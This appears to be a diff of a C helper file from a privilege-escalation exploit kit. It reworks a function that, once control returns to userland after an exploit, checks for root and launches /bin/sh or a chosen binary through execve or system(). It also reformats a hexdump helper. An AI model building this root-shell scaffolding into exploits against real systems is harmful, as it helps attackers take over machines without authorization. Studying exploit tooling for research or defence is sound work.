@@ -1,3 +1,9 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/types.h>
+#include <errno.h>
 #include "utils.h"
 
 /* Open file stream for a device/module */
@@ -14,7 +20,8 @@ int open_dev(const char *path, int flags)
 }
 
 /* Print a hex dump of memory */
-void hexdump(const char *label, const void *addr, size_t len) {
+void hexdump(const char *label, const void *addr, size_t len)
+{
     const unsigned char *p = (const unsigned char *)addr;
     printf("%s (%zu bytes):\n", label, len);
     for (size_t i = 0; i < len; ++i) {
@@ -25,15 +32,35 @@ void hexdump(const char *label, const void *addr, size_t len) {
 }
 
 /* Spawn root shell if uid == 0 */
-void spawn_shell(void)
-{
-    INFO("Returned to userland")
-    if (getuid() == 0) {
-        SUCCESS("GOT ROOT SHELL!");
-        system("/bin/sh");
-    } else {
-        FAILURE("Privesc failed");
-        exit(1);
+void _get_shell(const char *mode)
+{   /* Use get_shell() wrapper to pass function ptr */
+    if (!mode || strlen(mode) == 0) {
+        FAILURE("No mode specified for shell execution\n");
+        _exit(1);
     }
+
+    INFO("Returned to userland");
+
+    if (getuid() != 0) {
+        FAILURE("UID: %d — privilege escalation failed\n", getuid());
+        DIE("no root");
+    }
+
+    if (strcmp(mode, "execve") == 0) {
+        char *args[] = {"/bin/sh", NULL};
+        execve("/bin/sh", args, NULL);
+        DIE("execve failed");
+    } else if (strcmp(mode, "system") == 0) {
+        system("/bin/sh");
+        DIE("system() failed");
+    } else if (access(mode, X_OK) == 0) {
+        char *args[] = {(char *)mode, NULL};
+        execve(mode, args, NULL);
+        DIE("execve failed");
+    } else {
+        FAILURE("Invalid mode or path: %s\n", mode);
+    }
+
+    _exit(1); // failsafe
 }
 
